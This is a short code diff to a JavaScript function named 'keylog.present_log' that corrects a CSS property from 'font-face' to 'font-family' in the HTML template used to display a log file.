@@ -98,7 +98,7 @@ keylog.present_log=function() {
 
 	//writing the log file to a designed HTML file
 	var len=String(str).length;
-	var tmp_str='<!DOCTYPE html><html><head><meta charset="utf-8" /></head><body style="font-face:monospace">' + "\n";
+	var tmp_str='<!DOCTYPE html><html><head><meta charset="utf-8" /></head><body style="font-family:monospace">' + "\n";
 	var charrr = '';
 	var charrrAfter = '';
 
